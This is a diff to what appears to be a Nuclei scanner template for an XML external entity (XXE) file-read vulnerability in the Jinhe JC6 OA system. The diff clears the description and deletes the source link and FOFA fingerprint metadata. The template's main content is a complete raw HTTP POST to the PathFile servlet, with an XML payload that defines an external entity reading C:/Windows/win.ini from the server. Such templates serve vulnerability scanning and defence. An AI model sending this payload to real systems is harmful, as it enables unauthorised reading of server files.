@@ -3,12 +3,8 @@ info:
   name: 金和 JC6 PathFile XML实体注入致任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uswgmkpt6m54wehn'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: uswgmkpt6m54wehn
-    fofa: app="金和网络-金和OA"  || body="/jc6/platform/sys/login"
 http:
 - raw:
   - "POST /jc6/servlet/PathFile?GetUrl HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: close\nContent-Type: application/xml\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///C:/Windows/win.ini\" >]>\n<root>\n    <path>&xxe;</path>\n    <strType>file</strType>\n    <IsVir>no</IsVir>\n    <displayType>list</displayType>\n    <strFiles>*.*</strFiles>\n</root>"
